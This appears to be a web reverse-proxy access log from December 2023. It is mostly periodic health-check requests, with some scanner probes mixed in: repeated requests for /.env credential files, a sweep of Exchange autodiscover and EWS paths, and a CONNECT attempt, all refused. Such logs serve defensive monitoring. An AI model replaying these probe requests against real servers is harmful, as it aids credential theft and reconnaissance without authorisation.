159.203.109.206 - - [14/Dec/2023:08:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1408 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1409 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1410 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1411 "www@docker" "http://172.25.0.8:80" 0ms
40.118.212.119 - - [14/Dec/2023:08:57:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1412 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1413 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:08:58:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1414 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:08:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1415 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1416 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1417 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1418 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1419 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1420 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1421 "www@docker" "http://172.25.0.8:80" 1ms
198.20.69.98 - - [14/Dec/2023:09:02:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1422 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:09:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1423 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1424 "www@docker" "http://172.25.0.8:80" 1ms
91.92.243.232 - - [14/Dec/2023:09:03:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1425 "web-to-websecure@internal" "-" 0ms
198.20.69.98 - - [14/Dec/2023:09:03:22 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1426 "-" "-" 0ms
198.20.69.98 - - [14/Dec/2023:09:03:23 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1427 "-" "-" 0ms
198.20.69.98 - - [14/Dec/2023:09:03:24 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 19 "-" "-" 1428 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:09:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1429 "www@docker" "http://172.25.0.8:80" 1ms
198.20.69.98 - - [14/Dec/2023:09:03:25 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1430 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:09:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1431 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:09:04:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1432 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:09:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1433 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1434 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1435 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1436 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1437 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1438 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1439 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1440 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1441 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1442 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1443 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1444 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1445 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1446 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1447 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1448 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1449 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1450 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1451 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1452 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1453 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1454 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1455 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1456 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1457 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1458 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1459 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1460 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1461 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1462 "www@docker" "http://172.25.0.8:80" 0ms
90.151.171.108 - - [14/Dec/2023:09:18:46 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1463 "web-to-websecure@internal" "-" 0ms
90.151.171.108 - - [14/Dec/2023:09:18:56 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1464 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:09:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1465 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1466 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1467 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1468 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1469 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1470 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1471 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1472 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1473 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1474 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1475 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1476 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1477 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1478 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1479 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1480 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1481 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1482 "www@docker" "http://172.25.0.8:80" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:06 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 404 19 "-" "-" 1483 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:07 +0000] "GET /ews/exchanges/ HTTP/1.1" 404 19 "-" "-" 1484 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:07 +0000] "GET /ews/exchange%20/ HTTP/1.1" 404 19 "-" "-" 1485 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:07 +0000] "GET /ews/exchange/ HTTP/1.1" 404 19 "-" "-" 1486 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:08 +0000] "GET /ews/%20/ HTTP/1.1" 404 19 "-" "-" 1487 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:08 +0000] "GET /ews/ews/ HTTP/1.1" 404 19 "-" "-" 1488 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:09 +0000] "GET /ews/autodiscovers/ HTTP/1.1" 404 19 "-" "-" 1489 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:09 +0000] "GET /autodiscover/autodiscovers/ HTTP/1.1" 404 19 "-" "-" 1490 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:10 +0000] "GET /autodiscover/autodiscover%20/ HTTP/1.1" 404 19 "-" "-" 1491 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:10 +0000] "GET /autodiscover/autodiscoverrs/ HTTP/1.1" 404 19 "-" "-" 1492 "-" "-" 0ms
146.190.41.214 - - [14/Dec/2023:09:28:11 +0000] "GET /autodiscove/ HTTP/1.1" 404 19 "-" "-" 1493 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:09:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1494 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1495 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1496 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1497 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1498 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1499 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1500 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1501 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1502 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1503 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1504 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1505 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1506 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1507 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1508 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1509 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1510 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1511 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1512 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1513 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1514 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1515 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1516 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1517 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1518 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1519 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1520 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1521 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1522 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1523 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1524 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1525 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1526 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1527 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1528 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1529 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1530 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1531 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1532 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1533 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1534 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1535 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1536 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1537 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1538 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1539 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1540 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1541 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1542 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1543 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:09:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1544 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1545 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1546 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1547 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1548 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1549 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1550 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1551 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1552 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1553 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1554 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:09:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1555 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:09:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1556 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:09:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1557 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1558 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1559 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1560 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1561 "www@docker" "http://172.25.0.8:80" 0ms
78.153.140.219 - - [14/Dec/2023:10:02:05 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1562 "-" "-" 0ms
78.153.140.219 - - [14/Dec/2023:10:02:06 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1563 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:10:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1564 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:10:02:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1565 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:10:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1566 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1567 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1568 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1569 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1570 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1571 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1572 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1573 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1574 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1575 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1576 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1577 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1578 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1579 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1580 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1581 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1582 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1583 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1584 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1585 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1586 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1587 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1588 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1589 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1590 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1591 "www@docker" "http://172.25.0.8:80" 0ms
